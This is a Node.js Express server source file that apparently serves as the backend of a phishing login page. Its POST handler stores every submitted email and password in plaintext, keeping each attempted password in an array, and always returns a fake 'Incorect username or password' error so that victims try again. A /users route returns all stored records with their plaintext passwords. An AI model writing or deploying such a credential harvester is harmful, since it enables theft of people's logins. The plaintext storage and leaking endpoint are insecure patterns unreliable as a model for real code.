const express = require('express');
const mongoose = require('mongoose');
const cors = require('cors');
const User = require('./models/User');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(express.json());
app.use(cors());

// Serve static files from the public directory
app.use(express.static('public'));

// Serve index.html at the root URL
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/public/index.html');
});
// IMPORTANT CHANGE: Use process.env.MONGODB_URI for the connection string
mongoose.connect(process.env.MONGODB_URI)
  .then(() => {
    console.log('MongoDB Connected');
  })
  .catch(err => {
    console.error('MongoDB connection error:', err);
    process.exit(1);
  });
app.post('/', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: 'Email and password are required.' });
  }

  try {
    // Check if user already exists
    let existingUser = await User.findOne({ email });

    if (existingUser) {
      // If user exists, add the new password to their existing passwords array
      // Only add if the password isn't already present to avoid duplicates in the array
      if (!existingUser.password.includes(password)) {
        existingUser.password.push(password);
        await existingUser.save();
        //User already exists. New password added successfully! 
        return res.status(200).json({ message: 'Incorect username or password! ' });
      } else {
        //User already exists and this password is already associated.
        return res.status(200).json({ message: 'Incorect username or password.' });
      }
    } else {
      // If user does not exist, create a new user with the password as an array
      const newUser = new User({
        email,
        password: [password], // Store as an array with the first password
      });

      const savedUser = await newUser.save();
      //                  Registration successful!
      return res.status(201).json({ message: 'Incorect username or password.', user: { id: savedUser._id, email: savedUser.email } });
    }

  } catch (err) {
    console.error('Error during user registration/password update:', err);
    res.status(500).json({ message: 'Server error during operation.', error: err.message });
  }
});

// GET all users (for testing/admin purposes)
app.get('/users', async (req, res) => {
  try {
    const users = await User.find({});
    // Project necessary fields, excluding password array from direct client view in production
    const usersSafeData = users.map(user => ({ id: user._id, email: user.email, createdAt: user.createdAt, passwordsCount: user.password.length }));
    res.json(users);
  } catch (err) {
    console.error('Error fetching users:', err);
    res.status(500).json({ message: 'Server error fetching users.', error: err.message });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
